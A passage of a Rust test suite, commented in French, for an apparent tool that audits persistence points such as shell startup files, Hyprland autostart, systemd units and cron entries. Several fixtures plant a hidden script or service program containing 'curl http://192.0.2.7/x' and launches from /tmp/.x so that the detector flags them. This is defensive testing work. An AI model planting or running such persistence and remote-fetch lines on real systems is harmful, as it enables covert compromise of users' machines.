        assert_eq!(c.probleme, Some(Niveau::Eleve), "le script caché est signalé");
        let lignes = c.temoins().lignes();
        let chemins: Vec<&str> = lignes[0].cibles.iter().map(|c| c.chemin.as_str()).collect();
        assert_eq!(chemins, ["/usr/bin/bash", "~/.cache-x/rappel.sh"]);
        assert!(lignes[0].cibles[1].apercu.is_some(), "le script se montre");
        let declare = c;
        m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\ncurl http://192.0.2.7/x\n");
        assert!(!crate::apprentissage::essai_tait(&declare, &m.lancements()));

        let m = Maison::nouvelle("lua");
        m.ecrire(
            ".config/hypr/autostart.lua",
            "o.exec_on_start(\"/tmp/x/run\" .. suffixe)\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve));
        assert!(refus(&c).contains("ambiguïté"), "{}", refus(&c));
        m.ecrire(".config/hypr/autostart.lua", "o.exec_on_start(\"/tmp/x/run\")\n");
        assert!(crate::apprentissage::declarable(&m.lancements()).is_ok());

        let m = Maison::nouvelle("octets");
        let p = m.chemin(".config/systemd/user/a.service");
        std::fs::write(&p, b"[Unit]\nDescription=caf\xe9\n[Service]\nExecStart=/tmp/.x/a\n").unwrap();
        assert_eq!(m.lancements().probleme, Some(Niveau::Eleve));
    }

    /// M9 : un tube nommé à la place d'un fichier lu est dit, jamais compté comme sain (ni attendu : il bloquerait).
    #[test]
    fn tube_a_la_place_d_un_fichier() {
        let m = Maison::nouvelle("tube");
        let p = m.chemin(".bashrc");
        if !std::process::Command::new("mkfifo")
            .arg(&p)
            .status()
            .is_ok_and(|s| s.success())
        {
            return crate::essais::saute("mkfifo absent");
        }
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve));
        assert!(c.message.contains("non vérifié"), "{}", c.message);
    }

    /// M7 : un service système ajouté à la main lie ce qu'il lance ; changé, son information revient.
    #[test]
    fn service_ajoute_lie_son_programme() {
        let m = Maison::nouvelle("service");
        let unite = m.racine.join("etc/systemd/system/sauvegarde.service");
        std::fs::create_dir_all(unite.parent().unwrap()).unwrap();
        std::fs::write(&unite, "[Service]\nExecStart=/opt/sauvegarde/lancer --nuit\n").unwrap();
        let programme = m.racine.join("opt/sauvegarde/lancer");
        std::fs::create_dir_all(programme.parent().unwrap()).unwrap();
        std::fs::write(&programme, "#!/bin/sh\nrestic backup\n").unwrap();
        let mut r = Releveur {
            racine: m.racine.clone(),
            maison: m.chemin(""),
            ..Releveur::default()
        };
        let avant = temoin_de_service(&mut r, &unite).unwrap();
        assert_eq!(avant.cibles.len(), 1);
        assert_eq!(avant.cibles[0].chemin, "/opt/sauvegarde/lancer");
        std::fs::write(&programme, "#!/bin/sh\ncurl http://192.0.2.7/x\n").unwrap();
        let apres = temoin_de_service(&mut r, &unite).unwrap();
        assert_ne!(avant.trace, apres.trace);
    }

    /// Les dossiers d'ajout d'une unité, comme les cherche systemd.
    #[test]
    fn noms_des_ajouts() {
        assert_eq!(
            ajouts_de("a-b-c.service"),
            ["a-.service.d", "a-b-.service.d", "a-b-c.service.d", "service.d"]
        );
        assert_eq!(ajouts_de("x@1.service"), ["service.d", "x@.service.d", "x@1.service.d"]);
        assert!(directive_refusee("[Service]\nEnvironment=LANG=C TZ=UTC\n").is_none());
        assert!(directive_refusee("# EnvironmentFile=/x\n").is_none());
        assert_eq!(
            directive_refusee("Environment='A=1' \\\n# note\n  \"PATH=/tmp\"\n").as_deref(),
            Some("Environment=PATH")
        );
    }

    /// Une ligne de cron se lit sans son horaire ni le compte qui la lance.
    #[test]
    fn commandes_de_cron() {
        assert_eq!(commande_de_cron("*/5 * * * * /opt/a --b", false), "/opt/a --b");
        assert_eq!(commande_de_cron("@reboot /opt/a", false), "/opt/a");
        assert_eq!(commande_de_cron("0 3 * * * root /opt/a", true), "/opt/a");
        assert_eq!(commande_de_cron("@daily root /opt/a", true), "/opt/a");
    }
}
